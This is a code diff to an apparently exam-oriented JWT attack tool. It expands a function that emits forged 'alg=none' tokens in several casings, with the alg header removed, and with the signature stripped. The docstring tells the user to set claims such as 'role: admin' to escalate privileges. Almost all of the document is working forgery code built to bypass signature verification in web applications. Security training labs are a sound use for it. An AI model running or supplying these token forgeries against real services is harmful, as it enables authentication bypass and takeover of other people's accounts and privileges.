@@ -217,31 +217,67 @@ def cmd_decode(token: str) -> int:
 # ---------------------------------------------------------------------
 def cmd_none(token: str, modify: dict[str, str]) -> int:
     """
-    Generate a forgery with alg=none and an empty signature.
+    Generate every "alg=none"-style forgery variant worth trying.
 
-    --set key=value modifications go into the payload before re-encoding.
+    BSCP exam reality: if the server rejects `"alg":"none"` you can NOT
+    give up - try these escalations in order:
+
+      1. Casing variants - filters that lowercase-compare miss "None"
+         and "NONE"; filters that case-insensitive-compare to "none"
+         still miss creative mixings like "nOnE". We emit all five
+         common shapes.
+
+      2. `alg` key REMOVED entirely - some parsers default-to-none
+         when the header lacks an `alg` key.
+
+      3. Signature segment FULLY STRIPPED (no trailing dot) - some
+         parsers accept `header.payload` without the third part.
+         This is non-standard but real-world JWT libs have been
+         caught accepting it.
+
+      4. Empty-string signature with the trailing dot present
+         (`header.payload.`) - the canonical alg=none format.
+
+    --set key=value modifies the payload before re-encoding. Use to
+    bump `sub` to admin, set `role: admin`, etc.
     """
     header, payload, _, _, _, _ = parse_token(token)
 
-    # Try multiple casings - "none", "None", "NONE". Some libraries
-    # filter only the lowercase form and accept variants.
-    for alg_variant in ("none", "None", "NONE"):
-        new_header = dict(header)
-        new_header["alg"] = alg_variant
-        new_payload = dict(payload)
-        for k, v in modify.items():
-            # Try to preserve the original type of the claim if possible.
-            new_payload[k] = _coerce_value(v, payload.get(k))
+    # Apply payload modifications once (shared across all variants).
+    new_payload = dict(payload)
+    for k, v in modify.items():
+        # Try to preserve the original type of the claim if possible.
+        new_payload[k] = _coerce_value(v, payload.get(k))
+    # Compact JSON - matches what JWT libraries emit by default.
+    p_b64 = b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
 
-        # `separators=(",", ":")` removes the default spaces -
-        # produces the most compact JSON, which is what JWT libraries
-        # do by default. Helps the output look like a real token.
-        h_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
-        p_b64 = b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
+    def _emit(label: str, header_dict: dict, sig_suffix: str) -> None:
+        h_b64 = b64url_encode(json.dumps(header_dict, separators=(",", ":")).encode())
+        forged = f"{h_b64}.{p_b64}{sig_suffix}"
+        print(f"  {tag_ok()} {label}:  {forged}")
 
-        # Signature is empty for alg=none. The trailing dot is mandatory.
-        forged = f"{h_b64}.{p_b64}."
-        print(f"{tag_ok()} alg={alg_variant:>4}: {forged}")
+    # ---- Tier 1: alg casing variants with trailing-dot empty sig ----
+    print(f"{tag_info()} alg-value casings (most servers filter only \"none\"):")
+    for alg_variant in ("none", "None", "NONE", "nOnE", "NoNe"):
+        new_header = {**header, "alg": alg_variant}
+        _emit(f"alg={alg_variant!r:>9}", new_header, ".")
+
+    # ---- Tier 2: alg key removed entirely ----
+    # Some libraries (older PyJWT, custom impls) default to "none"
+    # when the header has no alg key at all.
+    print()
+    print(f"{tag_info()} alg key REMOVED (default-to-none parsers):")
+    header_no_alg = {k: v for k, v in header.items() if k != "alg"}
+    _emit("(alg key absent)", header_no_alg, ".")
+
+    # ---- Tier 3: signature fully stripped (no trailing dot) ----
+    # Non-standard but in the wild - some parsers split on '.' and
+    # only check parts[0..1], never validating parts[2] exists.
+    print()
+    print(f"{tag_info()} signature segment STRIPPED (no trailing dot):")
+    header_with_none = {**header, "alg": "none"}
+    _emit("(stripped, alg=none)", header_with_none, "")
+    _emit("(stripped, alg removed)", header_no_alg, "")
     return 0
 
 
